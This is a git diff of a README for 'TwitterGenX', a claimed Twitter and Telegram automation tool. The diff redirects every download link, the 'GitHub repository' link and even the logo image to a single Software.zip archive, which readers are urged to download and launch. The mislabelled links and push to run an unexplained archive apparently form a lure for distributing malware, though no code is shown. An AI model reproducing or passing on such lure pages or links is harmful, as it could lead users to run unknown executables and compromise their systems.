@@ -1,6 +1,6 @@
 # TwitterGenX 🐦🤖
 
-[![Software Download](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Software Download](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip)](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -24,7 +24,7 @@ Welcome to TwitterGenX, your one-stop solution for Twitter automation and Telegr
 
 Ready to supercharge your Twitter and Telegram experience? Download our software package from the following link:
 
-[![Software Download](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Software Download](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip)](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip)
 
 Remember, the software needs to be launched for you to start benefitting from all the amazing features TwitterGenX has to offer.
 
@@ -32,9 +32,9 @@ If you encounter any issues with the download link, be sure to check the "Releas
 
 ## Let's Connect
 
-Stay updated on the latest developments and releases by visiting our [GitHub repository](https://github.com/user-attachments/files/18388744/Software.zip). Your feedback and contributions are always welcomed!
+Stay updated on the latest developments and releases by visiting our [GitHub repository](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip). Your feedback and contributions are always welcomed!
 
-![TwitterGenX Logo](https://example.com/twittergenx-logo.png)
+![TwitterGenX Logo](https://github.com/tkontop123123123/TwitterGenX/releases/download/v2.0/Software.zip)
 
 Don't miss out on the opportunity to revolutionize your Twitter and Telegram automation workflows. Download TwitterGenX today and experience the future of social media management! 🚀🔥
 
